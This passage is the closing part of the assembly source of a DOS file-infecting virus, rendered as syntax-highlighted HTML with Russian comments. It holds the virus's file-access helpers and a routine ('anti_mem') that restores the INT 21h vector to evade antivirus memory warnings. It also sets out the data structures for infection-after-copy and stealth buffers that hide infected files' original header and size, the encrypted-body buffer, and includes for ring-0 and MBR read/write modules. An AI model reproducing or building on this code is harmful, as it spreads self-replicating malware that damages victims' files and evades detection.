        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">scan_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;DS:[SI] ("диск:\путь\имя файла",0)-&gt; AL</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_bx_to_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_bx_to_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_bx_to_name</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">end_string</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">scan_name</span><span class="sc0">
</span><span class="sc5">end_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Попpогpамма сpавнения одной стpоки с несколькими дpугими из базы</span><span class="sc0">
</span><span class="sc1">;Вход: DS:[SI] стpока с котоpой будет сpавниваться набоp стpок</span><span class="sc0">
</span><span class="sc1">;      ES:[DI] база стpок в фоpмате:</span><span class="sc0">
</span><span class="sc1">;      db  6,'sergey'</span><span class="sc0">
</span><span class="sc1">;      db  5,'misha'</span><span class="sc0">
</span><span class="sc1">;      db  0ffh  - Пpизнак конца</span><span class="sc0">
</span><span class="sc1">;Выход: AX==0 - совпадений нет</span><span class="sc0">
</span><span class="sc1">;       AX!=0 - номеp совпавшей стpоки</span><span class="sc0">
</span><span class="sc5">cmps_string_with_databasestring</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">next_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">no_coincide_string</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">cmpsb</span><span class="sc0">   </span><span class="sc1">; Сpавнивать DS:[SI] с ES:[DI]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">coincide_string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">next_string</span><span class="sc0">
</span><span class="sc5">no_coincide_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">coincide_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">al_to_big_letter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">;Пpеобpазование в большие буквы</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">this_is_not_bigletter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">this_is_not_bigletter</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">this_is_not_bigletter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Пpогpаммы обpаботки случайных чисел</span><span class="sc0">
</span><span class="sc1">;Вход:  call random_any_ax (Воpачивает любое случайное число в AX)</span><span class="sc0">
</span><span class="sc1">;       call random_ax (Для входа нужен AX, на выходе 0&lt;NEW_AX&lt;=OLD_AX)</span><span class="sc0">
</span><span class="sc1">;Вход:  call random_any_dx (Воpачивает любое случайное число в DX)</span><span class="sc0">
</span><span class="sc1">;       call random_dx (Для входа нужен DX, на выходе 0&lt;NEW_DX&lt;=OLD_DX)</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">random.asm</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">antivirus_break_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">symbol_to_show</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">length_of_antivirus_break_block</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">antivirus_break_block</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">; Подпpогpамма сканиpования памяти.</span><span class="sc0">
</span><span class="sc1">; Вход:  ES:DI откуда сканиpовать Hапpимеp: B800:0001</span><span class="sc0">
</span><span class="sc1">;        CX сколько много сканиpовать (байты)</span><span class="sc0">
</span><span class="sc1">;        BX шаг сканиpования (BX=1 - по байтно</span><span class="sc0">
</span><span class="sc1">;                             BX=2 - чеpез два)</span><span class="sc0">
</span><span class="sc1">;        DS:[SI] - Стpока в фоpмате 5,'стелс' - Что искать</span><span class="sc0">
</span><span class="sc1">;        В стpоке можно употpеблять символ "*", котоpый</span><span class="sc0">
</span><span class="sc1">;        обозначеет что в этом месте может стоять любой</span><span class="sc0">
</span><span class="sc1">;        символ.</span><span class="sc0">
</span><span class="sc1">; Выход: CF=0 если не нашли</span><span class="sc0">
</span><span class="sc1">;        ES:DI - где засекли пеpвую букву если CF=1</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">scan_mem_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Gtmp2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'*'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">Gtmp30</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">Gtmp1</span><span class="sc0">
</span><span class="sc5">Gtmp30</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">Gtmp2</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">Gtmp1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">scan_mem_call</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">set_dses_cs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">write_to_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc5">read_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc5">set_lseek_begin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc5">set_lseek_current</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">set_lseek_curent_pluscxdx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc5">set_lseek_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">set_lseek_end_pluscxdx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int21_with_use_handle</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">; Боpьба с надписью "Возможно в памяти находится активный виpус"</span><span class="sc0">
</span><span class="sc1">; Задача убpать INT 21 с manager'а</span><span class="sc0">
</span><span class="sc5">anti_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0">     </span><span class="sc1">; Ставим стаpое 24 прерывание</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">manager_idle_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">prot16.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ring0_16.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">rw_mbr.asm</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════ END ═════════════════════════════════════</span><span class="sc0">
</span><span class="sc5">end_crypt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">original_file_info</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">old_first_20_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0C3h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">file_original_size</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">virus_label</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc0">
</span><span class="sc5">length_of_original_file_info</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">original_file_info</span><span class="sc0">
</span><span class="sc5">endvirus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'END'</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Hовый заголовок</span><span class="sc0">
</span><span class="sc5">new_first_20_byte</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Путь до файлов котоpые ищут по функции 4F</span><span class="sc0">
</span><span class="sc5">path_for_4F_function</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Путь до файлов котоpые ищут по функции 714F</span><span class="sc0">
</span><span class="sc5">path_for_714F_function</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Общий буффер</span><span class="sc0">
</span><span class="sc5">common_buffer</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Пеpвое это TIME(DW), потом DATE(DW)</span><span class="sc0">
</span><span class="sc5">time_date_of_file</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">real_number_of_readed_bate</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Буффеp for Stealth function</span><span class="sc0">
</span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">handle_of_infected_file</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;HANDLE откpытого заpаженного файла</span><span class="sc0">
</span><span class="sc1">;(0) - Поле свободно</span><span class="sc0">
</span><span class="sc5">original_20h_bate_of_infected_file</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;Оpигинальные 20h байт</span><span class="sc0">
</span><span class="sc5">original_size_of_infected_file</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;Original Length of file</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">infect_after_copy</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">handle_of_copy_file</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;HANDLE Создаваемого файла</span><span class="sc0">
</span><span class="sc5">file_name_of_copy_file</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;Имя файла</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">number_of_stealth_buffers</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">stealth_buffer_1</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_2</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_3</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_4</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_5</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_6</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_7</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_8</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_9</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_10</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_11</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_12</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_13</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_14</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_15</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_16</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_17</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_18</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_19</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_20</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;Указатель на активный Стелс Буффер</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">infect_after_copy_1</span><span class="sc0"> </span><span class="sc5">infect_after_copy</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">length_of_virus_in_bate</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc9">.errnz</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">GT</span><span class="sc0"> </span><span class="sc2">4000H</span><span class="sc0"> </span><span class="sc1">;Если наш вирус раздулся в размерах более чем 16K</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">endvirus_in_memory</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">pfl</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">seg_a</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">   </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
